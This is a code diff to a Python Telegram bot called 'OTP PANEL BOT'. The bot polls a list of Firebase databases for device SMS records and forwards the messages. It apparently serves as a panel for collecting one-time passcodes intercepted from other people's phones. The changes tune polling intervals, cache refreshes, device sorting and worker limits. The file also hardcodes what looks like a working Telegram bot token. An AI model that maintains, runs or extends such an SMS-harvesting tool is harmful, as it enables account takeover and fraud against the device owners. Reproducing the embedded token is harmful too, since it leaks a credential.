@@ -3,7 +3,7 @@
 ══════════════════════════════════════════════════════
   OTP PANEL BOT — PRIVATE ADMIN EDITION           
   ULTRA-SPEED PROGRESSIVE SCANNER & NON-BLOCKING UI
-  (RAILWAY EXTREME RAM OPTIMIZED EDITION)
+  (RAILWAY LIFETIME STABLE EDITION - FIXED LIST & RAM)
 ══════════════════════════════════════════════════════
 """
 
@@ -74,7 +74,9 @@ LOCAL_URLS = extract_urls_from_files()
 RAW_URLS = list(set(HARDCODED_URLS + LOCAL_URLS))
 DATABASES = {f"P_{i}": url for i, url in enumerate(RAW_URLS)}
 
-POLL_INTERVAL   = 3  
+# 🔥 SMART POLLING (Reduces RAM load)
+POLL_INTERVAL   = 10  # SMS Check every 10 seconds
+CACHE_INTERVAL  = 600 # Full Device List Update every 10 minutes (600 seconds)
 SMS_LIMIT       = 20       
 TOKEN           = "8218848065:AAFw5snj5NTWbayoXSHHIaNEg-vFPuXGm-4"
 BOT_USERNAME    = "freepanelssmsbot"
@@ -121,7 +123,7 @@ SETTINGS = {
     "global_panels": []
 }
 
-# 🔥 EXTREME RAM OPTIMIZATION: Limits reduced to save Railway memory
+# 🔥 LIFETIME STABLE SEMAPHORES
 HTTP_SEMAPHORE = asyncio.Semaphore(20)
 WORKER_SEMAPHORE = asyncio.Semaphore(20)
 
@@ -616,7 +618,9 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
             number_map[d.id] = d 
 
     unique_devices = list(number_map.values())
-    unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, -d.timestamp))
+    
+    # 🔥 FIXED UP-DOWN JUMP ISSUE: Sorted by Status and then Alphabetically by Number/ID.
+    unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
     return unique_devices
 
 async def find_device_by_id(dev_id: str, bot_token: str, chat_id: int, users_db: dict) -> Optional[Device]:
@@ -1519,7 +1523,7 @@ async def _forward_sms(device: Device, sms: dict) -> None:
 
 WORK_QUEUE = asyncio.Queue()
 ACTIVE_WORKERS = []
-MAX_WORKERS = 5 # EXTREME RAM OPTIMIZATION FOR RAILWAY FREE TIER
+MAX_WORKERS = 10 # Balance between speed and RAM safety
 
 async def worker_auto_scaler():
     while True:
@@ -1535,31 +1539,15 @@ async def db_processor_worker():
         try:
             job_type, tag, url = await WORK_QUEUE.get()
             
-            if job_type == "INIT":
-                try: GLOBAL_DEVICE_CACHE[tag] = await fetch_db_data(tag, url)
+            if job_type == "INIT" or job_type == "CACHE_UPDATE":
+                try: 
+                    devs = await fetch_db_data(tag, url)
+                    if devs: GLOBAL_DEVICE_CACHE[tag] = devs
                 except: pass
                 
-                r_main, r_user, r_root = await asyncio.gather(fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url), return_exceptions=True)
-                for bulk in (r_main, r_user, r_root):
-                    if not isinstance(bulk, dict): continue
-                    for dev_id, sms_dict in bulk.items():
-                        if not isinstance(sms_dict, dict): continue
-                        for k in sms_dict: seen_ids.add(seen_key(dev_id, k))
-                            
-                type4_devs = [d for d in GLOBAL_DEVICE_CACHE.get(tag, []) if d.sms_path.endswith("receivedSms")]
-                if type4_devs:
-                    async def init_t4(d: Device):
-                        sms_dict = await fb_get(d.sms_path, d.base_url)
-                        if isinstance(sms_dict, dict):
-                            for k in sms_dict: seen_ids.add(seen_key(d.id, k))
-                    await asyncio.gather(*(init_t4(d) for d in type4_devs), return_exceptions=True)
-
-                global SCAN_PROGRESS
-                SCAN_PROGRESS["completed"] += 1
-
-            elif job_type == "CACHE_UPDATE":
-                try: GLOBAL_DEVICE_CACHE[tag] = await fetch_db_data(tag, url)
-                except: pass
+                if job_type == "INIT":
+                    global SCAN_PROGRESS
+                    SCAN_PROGRESS["completed"] += 1
 
             elif job_type == "POLL":
                 r_main, r_user, r_root = await asyncio.gather(fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url), return_exceptions=True)
@@ -1594,7 +1582,7 @@ async def db_processor_worker():
                                 except: pass
                     await asyncio.gather(*(fetch_t4_sms(d) for d in type4_devs), return_exceptions=True)
             
-            # RAM PROTECTION
+            # 🔥 STRICT RAM PROTECTION
             if len(seen_ids) > 20000:
                 seen_ids.clear()
 
@@ -1606,7 +1594,7 @@ async def db_processor_worker():
 
 async def cache_compiler():
     while True:
-        await asyncio.sleep(3) 
+        await asyncio.sleep(5) 
         all_devs = []
         for tag, list_devs in list(GLOBAL_DEVICE_CACHE.items()):
             if tag != "ALL": all_devs.extend(list_devs)
@@ -1620,12 +1608,16 @@ async def cache_compiler():
                 n_map[d.id] = d
                     
         res = list(n_map.values())
-        res.sort(key=lambda d: (0 if d.status == "online" else 1, -d.timestamp))
+        
+        # 🔥 FIXED UP-DOWN JUMP ISSUE: Sorted by Status and then Alphabetically by Number/ID.
+        res.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
         GLOBAL_DEVICE_CACHE["ALL"] = res
 
 async def master_dispatcher(app: Application) -> None:
     global first_run, _main_app
     _main_app = app
+    last_cache_time = 0
+    
     while True:
         try:
             dbs_to_poll = dict(DATABASES)
@@ -1639,11 +1631,20 @@ async def master_dispatcher(app: Application) -> None:
                 SCAN_PROGRESS = {"total": len(dbs_to_poll), "completed": 0}
                 for tag, url in dbs_to_poll.items(): await WORK_QUEUE.put(("INIT", tag, url))
                 first_run = False
+                last_cache_time = time.time()
                 print("\n✅ Bot started successfully. Listening for commands...\n")
             else:
+                now = time.time()
+                # Server load optimization: Only fetch full device list every 10 mins
+                if now - last_cache_time > CACHE_INTERVAL:
+                    for tag, url in dbs_to_poll.items():
+                        await WORK_QUEUE.put(("CACHE_UPDATE", tag, url))
+                    last_cache_time = now
+                
+                # Fast polling only for SMS every 10 seconds
                 for tag, url in dbs_to_poll.items():
-                    await WORK_QUEUE.put(("CACHE_UPDATE", tag, url))
                     await WORK_QUEUE.put(("POLL", tag, url))
+                    
         except Exception: pass
         await asyncio.sleep(POLL_INTERVAL)
 
